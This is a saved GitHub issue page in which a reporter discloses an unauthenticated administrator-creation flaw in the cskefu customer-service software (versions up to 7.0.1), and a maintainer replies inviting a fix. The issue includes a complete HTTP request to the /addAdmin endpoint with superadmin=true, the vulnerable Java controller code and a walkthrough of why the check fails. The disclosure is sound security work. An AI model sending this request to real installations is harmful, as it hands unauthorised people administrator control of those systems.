=== Content from github.com_df2ddefb_20250108_130757.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcskefu%2Fcskefu%2Fissues%2F724)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcskefu%2Fcskefu%2Fissues%2F724)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cskefu%2Fcskefu)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cskefu](/cskefu)
/
**[cskefu](/cskefu/cskefu)**
Public

* [Notifications](/login?return_to=%2Fcskefu%2Fcskefu) You must be signed in to change notification settings
* [Fork
  911](/login?return_to=%2Fcskefu%2Fcskefu)
* [Star
   2.7k](/login?return_to=%2Fcskefu%2Fcskefu)

* [Code](/cskefu/cskefu)
* [Issues
  233](/cskefu/cskefu/issues)
* [Pull requests
  0](/cskefu/cskefu/pulls)
* [Actions](/cskefu/cskefu/actions)
* [Projects
  2](/cskefu/cskefu/projects)
* [Security](/cskefu/cskefu/security)
* [Insights](/cskefu/cskefu/pulse)

Additional navigation options

* [Code](/cskefu/cskefu)
* [Issues](/cskefu/cskefu/issues)
* [Pull requests](/cskefu/cskefu/pulls)
* [Actions](/cskefu/cskefu/actions)
* [Projects](/cskefu/cskefu/projects)
* [Security](/cskefu/cskefu/security)
* [Insights](/cskefu/cskefu/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fcskefu%2Fcskefu%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fcskefu%2Fcskefu%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# 【安全漏洞】前台未授权增加管理员账号 #724

Open

3 tasks

[milkii0](/milkii0) opened this issue
Jul 18, 2022
· 1 comment

Open

3 tasks

# [【安全漏洞】前台未授权增加管理员账号](#top) #724

[milkii0](/milkii0) opened this issue
Jul 18, 2022
· 1 comment

Assignees
[![@milkii0](https://avatars.githubusercontent.com/u/34911111?s=40&v=4)](/milkii0)

Labels
[bug](/cskefu/cskefu/labels/bug)
软件缺陷
[v7](/cskefu/cskefu/labels/v7)
Version 7 Related Issue

## Comments

[![@milkii0](https://avatars.githubusercontent.com/u/34911111?s=80&u=37997724a3c4d1babea8b97b74e36874b5320f2e&v=4)](/milkii0)

Copy link

### **[milkii0](/milkii0)** commented [Jul 18, 2022](#issue-1307348918) • edited Loading

| 概述 存在添加管理员接口，调用该接口时没有对当前用户进行校验，导致未登录状态下可添加管理员账户。 There is an interface to add an administrator. When calling this interface, the current user is not verified, so that an administrator account can be added when not logged in.  **数据包（payload）：**  ``` GET /addAdmin?username=admin666&password=admin666123&email=admin666@admin6666.com&mobile=17777777776&superadmin=true HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Cache-Control: max-age=0  ```  \*\* 测试截图（Test screenshot）： \*\* [image](https://user-images.githubusercontent.com/34911111/179440566-1f4cbd45-bdea-48e6-84ba-a2761f99e094.png)  根据给出的URL According to the given URL <http://localhost/?schema=http&port=80&hostname=localhost&subtype=user&maintype=apps&typename=methodName&orgi=cskefu&webimport=8036&sessionid=f8dbdd6d51dd44788ccad36c02e7958b&models=cca&models=chatbot&models=report&models=entim&models=contacts&ip=172.18.0.1&userExpTelemetry=on>  跳转至管理界面 Jump to the management interface [image](https://user-images.githubusercontent.com/34911111/179440612-08cb67d1-633d-41e5-8b53-2d56fc9efc74.png)  **漏洞分析（Vulnerability analysis）** 漏洞源码（Vulnerability source code）：  ```  @RequestMapping("/addAdmin")     @Menu(type = "apps", subtype = "user", access = true)     public ModelAndView addAdmin(HttpServletRequest request, HttpServletResponse response, @Valid User user) {         String msg = "";         msg = validUser(user);         if (StringUtils.isNotBlank(msg)) {             return request(super.createView("redirect:/register.html?msg=" + msg));         } else {             user.setUname(user.getUsername());             user.setAdmin(true);             if (StringUtils.isNotBlank(user.getPassword())) {                 user.setPassword(MainUtils.md5(user.getPassword()));             }             user.setOrgi(super.getOrgi());             userRepository.save(user);         }         ModelAndView view = this.processLogin(request, user, "");         return view;     }      private String validUser(User user) {         String msg = "";         User tempUser = userRepository.findByUsernameAndDatastatus(user.getUsername(), false);         if (tempUser != null) {             msg = "username_exist";             return msg;         }         tempUser = userRepository.findByEmailAndDatastatus(user.getEmail(), false);         if (tempUser != null) {             msg = "email_exist";             return msg;         }         tempUser = userRepository.findByMobileAndDatastatus(user.getMobile(), false);         if (tempUser != null) {             msg = "mobile_exist";             return msg;         }         return msg;     } ```  addAdmin接口未进行权限校验，未登录状态可直接调用 The addadmin interface does not perform permission verification, and can be called directly in the unregistered state  增加用户前，判断传入的用户是否有效 Before adding users, judge whether the incoming users are valid [image](https://user-images.githubusercontent.com/34911111/179440638-6a865cf9-7f03-4189-9040-373f0ca0b360.png)  为了顺利到达最后一个return，传入的username，email，mobile都必须为数据库中的唯一值 n order to successfully reach the last return, the username, email and mobile passed in must be unique values in the database [image](https://user-images.githubusercontent.com/34911111/179440649-b65d06c9-203a-4938-b4af-50e7d4c24ffe.png)  当返回的msg为空时，我们就可以继续增加用户的操作，且将添加的用户设置为管理员 When the returned MSG is empty, we can continue to add users and set the added users as administrators [image](https://user-images.githubusercontent.com/34911111/179440672-d4f789e4-29a0-4f40-aeec-052e23b97696.png) 操作系统  * macOS or Mac OSX * Windows * Linux(Debian, CentOS, Ubuntu, etc.)  代码版本 代码版本 <= 7.0.1 祝福与不祝福 春松客服之所以开源，是基于这样一种信念：爱人也是爱己，利他也是利己。 对人和人美好关系的向往，对人潜力的信任。让我们相信因春松客服而受益的人，会回报给春松客服开源社区，我们[所有贡献者](https://github.com/chatopera/cskefu#%E8%B4%A1%E7%8C%AE%E8%80%85%E5%88%97%E8%A1%A8-)基于共赢的信念合作。 回报方式包括：[提交 PR](https://github.com/chatopera/cskefu/blob/osc/CONTRIBUTING.md)、购买春松客服相关的[付费产品和服务](https://www.chatopera.com/price.html)等。  因春松客服受益，而不回报开源社区的用户，我们不欢迎使用春松客服：我们开源并不是为了你们，你们是不被祝福的。 Open Source for the World [banner](https://www.chatopera.com) |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@milkii0](https://avatars.githubusercontent.com/u/34911111?s=40&u=37997724a3c4d1babea8b97b74e36874b5320f2e&v=4)](/milkii0)
[milkii0](/milkii0)
assigned [hailiang-wang](/hailiang-wang)
[Jul 18, 2022](#event-7008608369)

[![@hailiang-wang](https://avatars.githubusercontent.com/u/3538629?s=80&u=29e2198b42c060a33464c8dc3d94bc9a27ee37e0&v=4)](/hailiang-wang)

Copy link

Member

### **[hailiang-wang](/hailiang-wang)** commented [Jul 18, 2022](#issuecomment-1186725392)

| 您是解决该问题的最佳人选：   * 发现问题 * 开发者 * 使用者   欢迎提交 PR，参考： <https://docs.chatopera.com/products/cskefu/osc/contribution.html>  Thanks! |
| --- |

All reactions

Sorry, something went wrong.

[![@hailiang-wang](https://avatars.githubusercontent.com/u/3538629?s=40&u=29e2198b42c060a33464c8dc3d94bc9a27ee37e0&v=4)](/hailiang-wang)
[hailiang-wang](/hailiang-wang)
added
the
[bug](/cskefu/cskefu/labels/bug)
软件缺陷
label
[Jul 18, 2022](#event-7008631743)

[![@hailiang-wang](https://avatars.githubusercontent.com/u/3538629?s=40&u=29e2198b42c060a33464c8dc3d94bc9a27ee37e0&v=4)](/hailiang-wang)
[hailiang-wang](/hailiang-wang)
assigned [milkii0](/milkii0) and unassigned [hailiang-wang](/hailiang-wang)
[Jul 18, 2022](#event-7008631811)

[![@hailiang-wang](https://avatars.githubusercontent.com/u/3538629?s=40&u=29e2198b42c060a33464c8dc3d94bc9a27ee37e0&v=4)](/hailiang-wang)
[hailiang-wang](/hailiang-wang)
added
the
[v7](/cskefu/cskefu/labels/v7)
Version 7 Related Issue
label
[Oct 30, 2022](#event-7698726600)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fcskefu%2Fcskefu%2Fissues%2F724)

Assignees

[![@milkii0](https://avatars.githubusercontent.com/u/34911111?s=40&v=4)](/milkii0) [milkii0](/milkii0)

Labels

[bug](/cskefu/cskefu/labels/bug)
软件缺陷
[v7](/cskefu/cskefu/labels/v7)
Version 7 Related Issue

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@hailiang-wang](https://avatars.githubusercontent.com/u/3538629?s=52&v=4)](/hailiang-wang) [![@milkii0](https://avatars.githubusercontent.com/u/34911111?s=52&v=4)](/milkii0)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


